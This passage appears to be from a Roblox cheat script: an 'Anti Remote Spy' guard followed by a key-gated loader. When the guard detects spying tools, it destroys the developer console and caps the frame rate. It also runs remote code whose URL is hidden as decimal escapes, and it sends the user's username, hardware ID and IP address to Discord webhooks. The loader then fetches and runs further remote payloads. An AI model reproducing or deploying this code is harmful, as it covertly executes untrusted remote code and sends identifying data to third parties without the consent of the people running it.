                _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                    false
                setfpscap(getgenv().fpsPunishment)
                devconsole:Destroy()
                getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                    game:HttpGet(
                        "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                    )
                )()
                if getgenv().webhookLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (getgenv().webhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                if getgenv().globalLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (globalWebhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
            end

            -- simple spy
            if _G.SimpleSpyExecuted or type(_G.SimpleSpyExecuted) == "function" then
                _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                    false
                setfpscap(getgenv().fpsPunishment)
                devconsole:Destroy()
                getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                    game:HttpGet(
                        "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                    )
                )()
                if getgenv().webhookLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (getgenv().webhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                if getgenv().globalLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (globalWebhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
            end
            if _G.SimpleSpyMaxStringSize then
                _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                    false
                setfpscap(getgenv().fpsPunishment)
                devconsole:Destroy()
                if getgenv().webhookLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (getgenv().webhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                if getgenv().globalLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (globalWebhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                    game:HttpGet(
                        "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                    )
                )()
            end

            if getgenv().SimpleSpy then
                _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                    false
                setfpscap(getgenv().fpsPunishment)
                devconsole:Destroy()
                if getgenv().webhookLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (getgenv().webhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                if getgenv().globalLogs == true then
                    if res.Success then
                        local index = string.find(res.Body, "Executor Name:")
                        if index then
                            local plr = game.Players.LocalPlayer
                            local Content = ""
                            local Embed = {
                                ["color"] = "000000",
                                ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                    plr.Name ..
                                        "\n**Game Link:** https://www.roblox.com/games/" ..
                                            game.PlaceId ..
                                                "\n\n**Hardware ID:** " ..
                                                    string.sub(res.Body, 19, index - 5) ..
                                                        "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                ["author"] = {["name"] = "Anti Remote Spy Logs"}
                            }
                            (syn and syn.request or http_request or http.request) {
                                Url = (globalWebhook),
                                Method = "POST",
                                Headers = {["Content-Type"] = "application/json"},
                                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
                            }
                        end
                    end
                end
                getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                    game:HttpGet(
                        "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                    )
                )()
            end

            -- hyroxide
            for h, r in pairs(game.CoreGui:GetDescendants()) do
                if r.Name:find("ContextMenus") then
                    r:Destroy()
                    devconsole:Destroy()
                    wait(0.1)
                    _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                        false
                    setfpscap(getgenv().fpsPunishment)
                    getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                        game:HttpGet(
                            "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                        )
                    )()
                    if getgenv().webhookLogs == true then
                        if res.Success then
                            local index = string.find(res.Body, "Executor Name:")
                            if index then
                                local plr = game.Players.LocalPlayer
                                local Content = ""
                                local Embed = {
                                    ["color"] = "000000",
                                    ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                        plr.Name ..
                                            "\n**Game Link:** https://www.roblox.com/games/" ..
                                                game.PlaceId ..
                                                    "\n\n**Hardware ID:** " ..
                                                        string.sub(res.Body, 19, index - 5) ..
                                                            "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                    ["author"] = {["name"] = "Anti Remote Spy Logs"}
                                }
                                (syn and syn.request or http_request or http.request) {
                                    Url = (getgenv().webhook),
                                    Method = "POST",
                                    Headers = {["Content-Type"] = "application/json"},
                                    Body = game:GetService "HttpService":JSONEncode(
                                        {content = Content, embeds = {Embed}}
                                    )
                                }
                            end
                        end
                    end
                    if getgenv().globalLogs == true then
                        if res.Success then
                            local index = string.find(res.Body, "Executor Name:")
                            if index then
                                local plr = game.Players.LocalPlayer
                                local Content = ""
                                local Embed = {
                                    ["color"] = "000000",
                                    ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                        plr.Name ..
                                            "\n**Game Link:** https://www.roblox.com/games/" ..
                                                game.PlaceId ..
                                                    "\n\n**Hardware ID:** " ..
                                                        string.sub(res.Body, 19, index - 5) ..
                                                            "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                    ["author"] = {["name"] = "Anti Remote Spy Logs"}
                                }
                                (syn and syn.request or http_request or http.request) {
                                    Url = (globalWebhook),
                                    Method = "POST",
                                    Headers = {["Content-Type"] = "application/json"},
                                    Body = game:GetService "HttpService":JSONEncode(
                                        {content = Content, embeds = {Embed}}
                                    )
                                }
                            end
                        end
                    end
                end
            end

            -- developer console remote spy
            local devconsole = game.CoreGui:WaitForChild("DevConsoleMaster")
            devconsole.DevConsoleWindow.DevConsoleUI:WaitForChild("MainView")
            for d, c in pairs(devconsole.DevConsoleWindow.DevConsoleUI.MainView:GetDescendants()) do
                if c:IsA("TextLabel") then
                    if
                        string.match(
                            c.Text,
                            ("RemoteEvent" or "RemoteFunction" or "Spy" or "Logged" or "Logger" or "RemoteSpy")
                        )
                     then
                        devconsole:Destroy()
                        _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx =
                            false
                        setfpscap(getgenv().fpsPunishment)
                        if getgenv().webhookLogs == true then
                            if res.Success then
                                local index = string.find(res.Body, "Executor Name:")
                                if index then
                                    local plr = game.Players.LocalPlayer
                                    local Content = ""
                                    local Embed = {
                                        ["color"] = "000000",
                                        ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                            plr.Name ..
                                                "\n**Game Link:** https://www.roblox.com/games/" ..
                                                    game.PlaceId ..
                                                        "\n\n**Hardware ID:** " ..
                                                            string.sub(res.Body, 19, index - 5) ..
                                                                "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                        ["author"] = {["name"] = "Anti Remote Spy Logs"}
                                    }
                                    (syn and syn.request or http_request or http.request) {
                                        Url = (getgenv().webhook),
                                        Method = "POST",
                                        Headers = {["Content-Type"] = "application/json"},
                                        Body = game:GetService "HttpService":JSONEncode(
                                            {content = Content, embeds = {Embed}}
                                        )
                                    }
                                end
                            end
                        end
                        if getgenv().globalLogs == true then
                            if res.Success then
                                local index = string.find(res.Body, "Executor Name:")
                                if index then
                                    local plr = game.Players.LocalPlayer
                                    local Content = ""
                                    local Embed = {
                                        ["color"] = "000000",
                                        ["description"] = "**Alert Reason:** Possible RemoteSpy\n**Username:** " ..
                                            plr.Name ..
                                                "\n**Game Link:** https://www.roblox.com/games/" ..
                                                    game.PlaceId ..
                                                        "\n\n**Hardware ID:** " ..
                                                            string.sub(res.Body, 19, index - 5) ..
                                                                "\n\n**IP:** " .. game:HttpGet("http://api.ipify.org"),
                                        ["author"] = {["name"] = "Anti Remote Spy Logs"}
                                    }
                                    (syn and syn.request or http_request or http.request) {
                                        Url = (globalWebhook),
                                        Method = "POST",
                                        Headers = {["Content-Type"] = "application/json"},
                                        Body = game:GetService "HttpService":JSONEncode(
                                            {content = Content, embeds = {Embed}}
                                        )
                                    }
                                end
                            end
                        end
                        getfenv(1)["\108\111\97\100\115\116\114\105\110\103"](
                            game:HttpGet(
                                "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\87\120\101\114\47\87\120\101\114\47\109\97\105\110\47\114\111\98\108\111\120\47\121\111\117\114\101\95\97\110\95\105\100\105\111\116\46\108\117\97"
                            )
                        )()
                    end
                end
            end
        elseif
            _G.BTpX5SKNreFOyWnhAc7anyt6XFu9zFCuAPeq63wOn76Q85Bjjw2n084FT88UlFv6LUW45IAZ2n8h9U3QECwABbupB29X287W23pTOnjd0teyXSTvbpbs3M1c2IWf6oUT8VZN5Z3WJytRAB4Wcz2lW17194hjF6Di90YdEgxCmZ4zp2rfu8t3jBb6yC15hkaBK85X5k7W3N95zw5g68tsfnYaHIx1ZY81JNXBn4onTt63N98898LEi9ad0i342o2ST5e082ar87bDeXrq93Kzo37DdmX13351R40Uf48YVBNZW48k1jx1kIOkA9E1H1XeF0bE78Gmjg06ctozEWPP28zlzbGnaaVG4h1wi36H4z0DzC4S5Un1CwQ41ZiP85mxAAreb3wp1ZhA4x9plgC12xAHQR5Fr050KOrzYbYppJf4oTf9U15xI51EarWCExRbvV8tIEL1Bvg3c65CaA307piWAn5mu5dBE15bQY6BO25Py08gE4c3nh95neP7wqC31YhjL2w59Jm4f7rpR1R97Ljupp35qA88nSpaJsmx43my6HP1M2Y4qDGP9zl95AK95OhbCLuJxA99o6KrR7QXcqH0LQy5291BgQAMyo7wc9tmLSot3326yy48s1Q5474NNb313S1u7587q1hYpE4E9sOW3Dv2jHq954EDpY916toGMtm1OR59L22iC8onvggk1JgQPzOr5IXWAV2d43ujFvm1q7zlyaIH5px2NWB73732kNA4tfU3lRRe25vHsdy9avVVcm4wBU9I6LJJC8lAKLR0Dn2anaXD849ADFhW6SGmet13t6nCDc0hYVlJQW7ua814NUOWEV0mgg35Em3UFcVS2W11w05iuY1GkC67j23ft7H0o0o2pUR3tS1Iha8GnJS00mH43643uDMFG20F8m7QM1dOQxWyZfPaEr9VyFMx8j0eKlXDPEU66EDuCYk9JW26Ie7i5MeCY8S38bpG064V0qllIMq7AmY8L3dx ==
                false
         then
            setclipboard(math.random(1, 100000))
            game:Shutdown()
        end
    end
)

warn(
    [[Done!
                     _     _     _____                               _               _____                 
     /\             | |   (_)   |  __ \                             | |             / ____|                
    /  \     _ __   | |_   _    | |__) |   ___   _ __ ___     ___   | |_    ___    | (___    _ __    _   _ 
   / /\ \   | '_ \  | __| | |   |  _  /   / _ \ | '_ ` _ \   / _ \  | __|  / _ \    \___ \  | '_ \  | | | |
  / ____ \  | | | | | |_  | |   | | \ \  |  __/ | | | | | | | (_) | | |_  |  __/    ____) | | |_) | | |_| |
 /_/    \_\ |_| |_|  \__| |_|   |_|  \_\  \___| |_| |_| |_|  \___/   \__|  \___|   |_____/  | .__/   \__, |
                                                                                            | |       __/ |
                                                                                            |_|      |___/ 
  _                                  _       _              _   _ 
 (_)                                | |     | |            | | | |
  _   ___      ___   _ __     __ _  | |__   | |   ___    __| | | |
 | | / __|    / _ \ | '_ \   / _` | | '_ \  | |  / _ \  / _` | | |
 | | \__ \   |  __/ | | | | | (_| | | |_) | | | |  __/ | (_| | |_|
 |_| |___/    \___| |_| |_|  \__,_| |_.__/  |_|  \___|  \__,_| (_)
]]
)

local function contains(table, val)
    for i = 1, #table do
        if table[i] == val then
            location = i
            return true
        end
    end
    return false
end


local http_request = http_request
if syn then
    http_request = syn.request
elseif SENTINEL_V2 then
    function http_request(tb)
        return {
            StatusCode = 200,
            Body = request(tb.Url, tb.Method, (tb.Body or ""))
        }
    end
end
    warn(
        [[Done!
   _____                        _                       _                       _              _   _ 
  / ____|                      | |                     | |                     | |            | | | |
 | |       _ __    __ _   ___  | |__     ___   _ __    | |   ___     __ _    __| |   ___    __| | | |
 | |      | '__|  / _` | / __| | '_ \   / _ \ | '__|   | |  / _ \   / _` |  / _` |  / _ \  / _` | | |
 | |____  | |    | (_| | \__ \ | | | | |  __/ | |      | | | (_) | | (_| | | (_| | |  __/ | (_| | |_|
  \_____| |_|     \__,_| |___/ |_| |_|  \___| |_|      |_|  \___/   \__,_|  \__,_|  \___|  \__,_| (_)
                                                                                                     
                                                                                                     ]]
    )
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/ksadjaskhjdakdhj/kojwadoadwad/main/libary"))()
local window = Library.CreateLib("Security")
local main = window:NewTab("PassWord")
local section = main:NewSection("Please Put Your Key.")
local plr = game.Players.LocalPlayer
local clientid = game:GetService("RbxAnalyticsService"):GetClientId()
section:NewTextBox("Put your Key", "", function(key)
if key == "js9dh9dh2-H289hd88d-8928hasd8" then -- Shinra
loadstring(game:HttpGet('https://raw.githubusercontent.com/bycrybaas3af/asdasdasasdasd/main/opkaj%C4%B1j%C4%B1psdfj%C4%B1peaj%C4%B1pas%C4%B1jds'))()
